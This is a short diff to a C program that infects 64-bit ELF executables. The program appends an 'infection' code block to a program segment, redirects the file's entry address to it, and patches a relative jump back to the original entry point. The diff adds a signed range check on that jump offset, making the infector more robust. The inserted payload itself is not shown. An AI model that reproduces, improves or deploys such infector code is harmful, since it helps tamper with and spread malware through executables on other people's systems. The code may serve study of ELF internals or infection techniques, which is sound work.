@@ -113,6 +113,7 @@ int main(int argc, char *argv[])
     Elf64_Phdr *phdr;
     Elf64_Off pos;
     size_t filesize;
+    off_t offset;
     char *image;
     int n;
 
@@ -147,16 +148,16 @@ int main(int argc, char *argv[])
 	bail(filename, "unable to find a usable infection point");
     if (phdr[n].p_offset + phdr[n].p_filesz >= filesize)
 	bail(filename, "invalid program segment in header table.");
-    if (phdr[n].p_filesz > 0x7FFFFFFF - sizeof infection)
-	bail(filename, "cannot infect a program segment >2GB.");
 
     /* Modify the executable's entry address to point to the chosen
      * location, and modify the infection program to jump to the
      * original entry address after it has finished.
      */
     pos = phdr[n].p_vaddr + phdr[n].p_filesz;
-    *(Elf64_Word*)(infection + sizeof infection - 4) =
-			(Elf64_Word)ehdr->e_entry - (pos + sizeof infection);
+    offset = ehdr->e_entry - (pos + sizeof infection);
+    if (offset > 0x7FFFFFFFL || offset < -0x80000000L)
+	bail(filename, "cannot infect program: relative jump >2GB.");
+    *(Elf64_Word*)(infection + sizeof infection - 4) = (Elf64_Word)offset;
     ehdr->e_entry = pos;
 
     /* Insert the infection program into the executable.
